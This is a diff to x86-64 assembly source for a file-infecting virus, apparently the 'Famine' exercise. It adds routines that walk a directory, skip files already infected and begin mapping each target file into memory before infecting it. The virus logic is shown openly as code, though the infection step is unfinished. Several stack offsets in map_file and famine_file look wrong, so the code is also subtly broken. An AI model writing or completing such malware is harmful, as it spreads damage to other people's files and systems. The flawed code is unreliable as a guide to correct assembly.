@@ -114,6 +114,7 @@ retn
 
 %define REGULAR_FILE 8
 %define DIRECTORY_FILE 4
+;list all files in a folder and calls falmine_file to infect it if it's a regular file
 list_files:
 	sub rsp, 1024;this is gonna be our buffer
 	sub rsp, 4; fd
@@ -160,7 +161,8 @@ list_files:
 	add rsp,1024
 retn
 
-
+;infect ONE file
+;void famine_file(char *fname)
 famine_file:
 	push rbx
 	push rcx
@@ -172,14 +174,21 @@ famine_file:
 	push rdx
 	push rdi
 
-
+	sub rsp, 8; int filesize
+	sub rsp, 8; void *file returned by mmap
 	sub rsp, 4 ;fd
 
 	call open_file
+	cmp rax, -1
+	je leave_famine_file ; could not open file, so skip it
 	mov [rsp], rax;stock fd
 	call check_already_infected ; int check_already_infected(int fd)
 	cmp rax, 0
 	jne leave_famine_file; file is already infected 
+	mov rdi, [rsp]; fd
+	lea rsi, [rsp + 12]; &fsize
+	call map_file ; map_file(int fd, int *filesize)
+
 
 	leave_famine_file:
 	mov rax, 3 ; close syscall n.
@@ -187,6 +196,8 @@ famine_file:
 	syscall
 
 	add rsp, 4
+	add rsp, 8
+	add rsp, 8
 	pop rdi
 	pop rdx
 	pop rsi
@@ -263,4 +274,39 @@ check_already_infected:
 	pop rcx
 	pop rbx
 
+retn
+; void *map_file(int fd, int *fsize)
+; returns a ptr to fd mapped in memory
+map_file:
+	sub rsp, 8; start of file saved for lseek
+
+	push rsi; save fsize
+
+	; First we need to get the file size
+
+	mov rax, 8; lseek
+	mov rsi, 0
+	mov rdx, 1; SEEK_CUR
+	syscall; lseek(fd, 0, SEEK_CUR)
+	
+	mov [rsp], rax; start = lseek(...)
+	mov rax, 8
+	mov rsi, 0
+	mov rdx, 2; SEEK_END
+	syscall; lseek(fd, 0, SEEK_END)
+	pop rsi
+	mov [rsi], rax; *fsize = lseek(...)
+	
+	push rsi
+	mov rsi, [rsp]
+	mov rdx, 0; SEEK_SET
+	mov rax, 8
+	syscall; lseek(fd, start, SEEK_SET) put cursor back at start
+	pop rsi; rsi is now fsize again
+	
+	;Time to map the file into memory
+
+
+
+	add rsp, 8
 retn
